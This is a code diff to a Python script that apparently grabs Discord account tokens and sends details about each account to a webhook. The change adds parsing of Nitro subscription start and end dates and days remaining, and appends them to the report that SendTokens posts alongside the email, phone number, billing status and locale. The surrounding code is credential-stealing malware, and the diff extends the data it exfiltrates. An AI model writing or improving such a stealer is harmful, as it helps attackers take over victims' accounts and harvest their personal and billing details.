@@ -8,6 +8,7 @@ import urllib3
 from urllib.request import Request, urlopen
 from requests import post, get
 import random
+from datetime import datetime
 
 user_agents = ['Mozilla/5.0 (X11; Linux i686; rv:7.0) Gecko/20150626 Firefox/36.0',
 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_5) AppleWebKit/5342 (KHTML, like Gecko) Chrome/37.0.869.0 Mobile Safari/5342',
@@ -140,9 +141,14 @@ def NitroCheck(token):
     has_nitro = bool(len(nitro_data) > 0)
     if has_nitro:
         has_nitro = True
+        end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+        start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+        days_left = abs((start - end).days)
+
+        return has_nitro, start, end, days_left
     else:
         has_nitro = False
-    return has_nitro
+        return has_nitro, nitro_data
 
 def GetLocale(token):
     languages = {
@@ -207,7 +213,7 @@ def SendTokens(webhook_url, tokens_grabbed = None):
         phone_number = GetPhoneNumber(token)
         verified_check = VerifiedCheck(token)
         billing = BillingCheck(token)
-        nitro = NitroCheck(token)
+        nitro = NitroCheck(token)[0]
         locale = GetLocale(token)[0]
         language = GetLocale(token)[1]
         
@@ -221,8 +227,15 @@ Email      = {email}
 Phone      = {phone_number}
 Verified   = {verified_check}
 Billing    = {billing}
-Nitro      = {nitro}
-Locale     = {locale}
+Nitro      = {nitro}'''
+
+        if nitro == True:
+            nitrostart = NitroCheck(token)[1]
+            nitroend = NitroCheck(token)[2]
+            daysofnitro = NitroCheck(token)[3]
+            embed[0]['description'] += f'\n\nNitro Started = {nitrostart}\nNitro Ends = {nitroend}\nDays Left = {daysofnitro}\n\n'
+
+        embed[0]['description'] += f'''Locale     = {locale}
 Language   = {language}'''
 
 
